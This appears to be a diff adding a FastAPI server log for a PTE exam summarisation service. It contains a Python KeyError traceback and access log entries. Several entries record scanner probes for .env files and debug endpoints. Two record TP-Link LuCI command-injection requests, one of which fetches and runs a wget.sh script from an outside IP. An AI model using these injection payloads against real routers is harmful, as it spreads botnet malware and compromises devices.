+    await route.handle(scope, receive, send)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/routing.py", line 275, in handle
+    await self.app(scope, receive, send)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/routing.py", line 65, in app
+    response = await func(request)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fastapi/routing.py", line 231, in app
+    raw_response = await run_endpoint_function(
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/fastapi/routing.py", line 162, in run_endpoint_function
+    return await run_in_threadpool(dependant.call, **values)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/starlette/concurrency.py", line 41, in run_in_threadpool
+    return await anyio.to_thread.run_sync(func, *args)
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/to_thread.py", line 56, in run_sync
+    return await get_async_backend().run_sync_in_worker_thread(
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/_backends/_asyncio.py", line 2177, in run_sync_in_worker_thread
+    return await future
+  File "/root/miniconda3/envs/vardy_tests_env/lib/python3.8/site-packages/anyio/_backends/_asyncio.py", line 859, in run
+    result = context.run(func, *args)
+  File "/code/aisolus/aisolus/apis/api_routes/route_pte_sst.py", line 39, in pte_summarize_spoken_text
+    summary = calculate_base_summary(
+  File "/code/aisolus/aisolus/src/inference_function.py", line 135, in calculate_base_summary
+    summary = SUMMARYDataloader(
+  File "/code/aisolus/aisolus/src/modules/pte.py", line 217, in __init__
+    self.sentences, self.nlp_sentences = self.nlp_sentence_parser()
+  File "/code/aisolus/aisolus/src/modules/pte.py", line 237, in nlp_sentence_parser
+    pos_dep = [(nlp['text'], nlp['xpos'], nlp['upos'], nlp['deprel'],
+  File "/code/aisolus/aisolus/src/modules/pte.py", line 237, in <listcomp>
+    pos_dep = [(nlp['text'], nlp['xpos'], nlp['upos'], nlp['deprel'],
+KeyError: 'deprel'
+
+2024-07-19 02:07:06 INFO:     172.71.218.2:0 - "POST /pte/summary-spoken-text HTTP/1.1" 500 Internal Server Error
+2024-07-19 02:07:06 INFO:     172.71.215.26:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:07:06 INFO:     162.158.179.143:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:08:17 INFO:     172.71.219.50:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:08:17 INFO:     162.158.114.171:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:08:18 INFO:     172.71.214.99:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 02:39:57 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 02:46:00 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 03:18:42 INFO:     52.167.144.59:0 - "GET /robots.txt HTTP/1.1" 404 Not Found
+2024-07-19 03:18:54 INFO:     40.77.167.230:0 - "GET /sitemap.xml.gz HTTP/1.1" 404 Not Found
+2024-07-19 03:25:49 INFO:     114.119.155.2:0 - "GET /robots.txt HTTP/1.1" 404 Not Found
+2024-07-19 03:33:18 INFO:     213.52.128.160:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 03:38:07 INFO:     20.184.12.180:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 03:38:13 INFO:     20.184.12.180:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-19 03:53:15 INFO:     93.174.93.12:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 04:02:52 INFO:     92.249.48.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 04:02:52 INFO:     162.158.114.166:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 04:03:18 INFO:     103.56.61.130:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 04:04:36 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 04:21:34 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 Not Found
+2024-07-19 04:21:34 INFO:     45.148.10.202:0 - "GET /cgi-bin/luci/%3Bstok%3D/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 Not Found
+2024-07-19 04:22:01 INFO:     52.167.144.176:0 - "GET /sitemap.xml.gz HTTP/1.1" 404 Not Found
+2024-07-19 04:25:21 INFO:     91.92.247.56:0 - "GET /app/.env HTTP/1.1" 404 Not Found
+2024-07-19 04:34:02 INFO:     149.50.103.48:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 04:45:11 INFO:     162.158.114.246:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 04:47:39 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Unsupported upgrade request.
+Unsupported upgrade request.
+2024-07-19 04:49:00 INFO:     162.158.179.141:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 04:55:53 INFO:     172.71.214.68:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 04:58:13 INFO:     162.158.179.119:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 04:59:23 INFO:     83.97.73.245:0 - "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 Not Found
+2024-07-19 05:01:12 INFO:     46.235.42.52:0 - "GET /index.php?here=1111 HTTP/1.1" 404 Not Found
+2024-07-19 05:03:27 INFO:     43.133.72.69:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 05:05:13 INFO:     172.71.211.59:0 - "POST /pte/summary-writing-text HTTP/1.1" 200 OK
+2024-07-19 05:06:40 INFO:     142.93.185.230:0 - "GET /index.php?of=1&a=1 HTTP/1.1" 404 Not Found
+2024-07-19 05:16:47 INFO:     185.191.126.213:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 05:21:07 INFO:     172.71.218.190:0 - "POST /pte/summary-spoken-text HTTP/1.1" 200 OK
+2024-07-19 05:47:01 INFO:     83.97.73.245:0 - "GET /actuator/gateway/routes HTTP/1.1" 404 Not Found
+2024-07-19 05:57:46 INFO:     172.71.215.52:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 06:03:53 INFO:     185.224.128.43:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 06:04:25 INFO:     138.68.178.173:0 - "POST /index.php?hj=83u HTTP/1.1" 404 Not Found
+2024-07-19 06:05:22 INFO:     46.19.143.26:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 06:20:58 INFO:     162.158.114.12:0 - "POST /pte/essay HTTP/1.1" 200 OK
+2024-07-19 07:03:33 INFO:     80.82.77.202:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 07:09:08 INFO:     51.120.120.18:0 - "GET /.env HTTP/1.1" 404 Not Found
+2024-07-19 07:09:09 INFO:     51.120.120.18:0 - "POST / HTTP/1.1" 404 Not Found
+2024-07-19 07:23:18 INFO:     43.153.110.177:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 07:25:44 INFO:     58.49.233.126:0 - "GET / HTTP/1.1" 404 Not Found
+2024-07-19 07:32:09 INFO:     172.71.218.3:0 - "P
